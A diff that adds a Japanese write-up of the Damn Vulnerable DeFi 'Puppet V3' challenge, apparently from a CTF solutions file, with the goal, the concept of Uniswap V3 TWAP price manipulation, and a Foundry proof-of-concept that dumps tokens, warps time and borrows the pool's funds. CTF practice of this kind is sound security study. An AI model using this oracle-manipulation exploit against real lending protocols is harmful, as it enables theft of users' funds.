@@ -306,3 +306,41 @@ by tinamints
         );
     }
 `
+
+## 14. Puppet V3
+### 条件 :
+- レンディングプールから100万DVTを全額recoveryへ移す
+- チャレンジの時間制限内（セットアップ後115秒未満）に完了する
+### 概念 :
+-  Uniswap V3のTWAPオラクル価格操作
+-  時間加重平均価格（`vm.warp`で操作の反映を遅らせる仕組み）
+### 解法 :
+- プレイヤーの110 DVTを`exactInputSingle`でUniswap V3プールに売り、トークン価格を暴落させる。その後`vm.warp`で時間制限ギリギリまで時間を進め、TWAPを暴落後の価格に近づける。これにより`calculateDepositOfWETHRequired`が十分安くなり、わずかなWETH担保で100万DVTを借りられる
+### POC
+` function test_puppetV3() public checkSolvedByPlayer {
+        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        token.approve(address(uniswapRouterAddress), type(uint256).max);
+        uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log("quote1: ", quote1);
+ 
+        ISwapRouter(uniswapRouterAddress).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp,
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                0,
+                0
+            )
+        );  
+         vm.warp(block.timestamp + 114);
+        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), quote);
+        console.log("quote: ", quote);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        
+    }
+`
